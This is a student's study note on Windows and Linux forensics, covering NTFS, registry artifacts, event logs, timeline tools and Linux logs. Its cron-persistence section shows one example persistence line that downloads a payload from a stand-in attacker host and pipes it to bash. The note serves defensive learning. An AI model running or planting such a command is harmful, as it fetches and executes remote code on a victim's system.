---
type: concept
subject: dfir
tags: [cybersecurity, concept, dfir, concepts, windows-forensics, linux-forensics, registry, ntfs, artifacts, timeline]
status: learning
created: 2026-07-02
---

# Windows & Linux Forensics

> 📝 **Concept Note** — DFIR Unit III | Source: MCA Sem III Syllabus

---

## Windows File System Internals

### FAT vs NTFS

| Feature            | FAT32                    | NTFS                       |
| ------------------ | ------------------------ | -------------------------- |
| Full Form          | File Allocation Table 32 | New Technology File System |
| Max file size      | 4 GB                     | 16 TB                      |
| Max Partition Size | 8 TB                     | 8 PB                       |
| Journaling         | No                       | Yes ($LogFile)             |
| Permissions        | No                       | ACLs                       |
| Forensic value     | Limited metadata         | Rich metadata (MFT)        |
| Common use         | USB drives, SD cards     | Windows system drives      |



### Master File Table (MFT)
The **$MFT** is the backbone of NTFS — every file and directory has an MFT entry containing:
- Filename, timestamps (created, modified, accessed, MFT modified)
- File size and data location
- Security descriptors (permissions)
- Whether file is resident (small files stored IN the MFT) or non-resident

### Key NTFS System Files

| File | Purpose | Forensic Value |
|------|---------|---------------|
| **$MFT** | Master File Table | All file metadata |
| **$LogFile** | Transaction journal | What changed and when |
| **$UsnJrnl** | Change journal | History of file changes |
| **$Bitmap** | Allocation bitmap | Which clusters are used |

### Deleted File Recovery from NTFS
When deleted: MFT entry marked **inactive**, but data remains until overwritten. Forensic tools (Autopsy) can recover files from inactive MFT entries and unallocated space.

---

## Windows Artifacts

### Registry Hives

| Hive | Location | Contains |
|------|----------|----------|
| **SAM** | `C:\Windows\System32\config\SAM` | Local user accounts and password hashes |
| **SECURITY** | `C:\Windows\System32\config\SECURITY` | Security policies, cached domain credentials |
| **SOFTWARE** | `C:\Windows\System32\config\SOFTWARE` | Installed software, OS configuration |
| **SYSTEM** | `C:\Windows\System32\config\SYSTEM` | Hardware config, services, mounted devices |
| **NTUSER.DAT** | `C:\Users\<username>\NTUSER.DAT` | Per-user settings, recent files, run history |

### Registry Keys of Interest

| Key Path | What It Reveals |
|----------|----------------|
| `SYSTEM\MountedDevices` | Devices that were connected |
| `SYSTEM\ControlSet001\Enum\USBSTOR` | USB device history (vendor, product, serial) |
| `SOFTWARE\Microsoft\Windows\CurrentVersion\Run` | Programs that auto-start (persistence) |
| `NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs` | Recently opened files |
| `NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist` | Programs executed (ROT13 encoded) |
| `NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` | Run dialog history |

### Event Logs

| Log | Location | Key Events |
|-----|----------|-----------|
| **Security** | `Security.evtx` | Logins (4624), failed logins (4625), account creation (4720) |
| **System** | `System.evtx` | Service installation (7045), system startup/shutdown |
| **Application** | `Application.evtx` | Application errors and warnings |

> 🔗 Full reference: [[Windows Event IDs Reference]] ⚡

### Browser Artifacts

| Browser | History Location | Cookie DB | Downloads |
|---------|-----------------|-----------|-----------|
| Chrome | `AppData\Local\Google\Chrome\User Data\Default\History` | Cookies | History |
| Firefox | `AppData\Roaming\Mozilla\Firefox\Profiles\*.default\places.sqlite` | cookies.sqlite | downloads |
| Edge | Similar to Chrome (Chromium-based) | | |

**Forensic value:** URLs visited, timestamps, search queries, downloaded files, cached pages, form data

### Prefetch Files
Location: `C:\Windows\Prefetch\`
- Records: program name, execution count, last run time, files accessed
- Format: `PROGRAM.EXE-XXXXXXXX.pf`
- **Forensic value:** Proves a program was executed, even if deleted

### LNK Files (Shortcuts)
- Created automatically when files are opened
- Contain: target path, timestamps, volume serial number, MAC address
- Found in: `C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Recent\`

### Shellbags
- Registry entries tracking folder access (view settings, window position)
- Prove user **browsed** a specific folder even if folder/files are deleted
- Useful for proving USB drive access

---

## Timeline Analysis

### log2timeline / Plaso
Automated tool that extracts timestamps from multiple sources and creates a single unified timeline.

```bash
# Create timeline from disk image
log2timeline.py timeline.plaso evidence.E01

# Convert to CSV for analysis
psort.py -o l2tcsv timeline.plaso > timeline.csv
```

**Sources it parses:** MFT, event logs, browser history, registry, prefetch, LNK files, and more.

---

## Linux Forensics

### ext3/ext4 File System
- Standard Linux file system
- **Journaling** — records changes before writing (aids recovery)
- **Inodes** — contain file metadata (like MFT entries)
- Deleted files: inode data pointer zeroed, but data may remain

### Key Directories

| Directory | Forensic Value |
|-----------|---------------|
| `/var/log/` | System and application logs |
| `/etc/` | System configuration files |
| `/home/<user>/` | User data, dotfiles, history |
| `/tmp/` | Temporary files (attacker staging area) |
| `/root/` | Root user's home directory |

### Critical Log Files

| Log | Contents |
|-----|----------|
| `/var/log/auth.log` | Authentication events (SSH, sudo) |
| `/var/log/syslog` | General system messages |
| `/var/log/kern.log` | Kernel messages |
| `/var/log/apache2/access.log` | Web server requests |
| `/var/log/cron.log` | Cron job execution |

### User Account Artifacts

| File | Contents |
|------|----------|
| `/etc/passwd` | User accounts (username, UID, home, shell) |
| `/etc/shadow` | Password hashes (restricted access) |
| `/etc/group` | Group memberships |
| `~/.bash_history` | Command history |
| `~/.ssh/known_hosts` | SSH connections made |
| `~/.ssh/authorized_keys` | Who can SSH in as this user |

### Cron Jobs as Persistence
Attackers add cron jobs for persistence:
```bash
# User crontabs
crontab -l -u <username>

# System crontabs
/etc/crontab
/etc/cron.d/
/etc/cron.daily/
```

**Suspicious cron:** `*/5 * * * * curl http://evil.com/payload.sh | bash`

---

## Forensic Tools Summary

| Tool | Purpose | Type |
|------|---------|------|
| **Autopsy** | Disk analysis, file recovery, timeline | Open-source GUI |
| **Sleuth Kit** | CLI disk forensics (Autopsy's backend) | Open-source CLI |
| **FTK** | Complete forensic suite | Commercial |
| **Registry Explorer** | Windows registry analysis | Free |

---

## Related Concepts

- [[Evidence Acquisition & Imaging]] — How evidence gets to analysis stage
- [[Digital Forensics Fundamentals]] — Process and legal framework
- [[Network & Email Forensics]] — Network-level investigation
- [[Forensic Artifacts Reference]] ⚡
- [[Windows Event IDs Reference]] ⚡
- [[DFIR MOC]] — Subject navigation
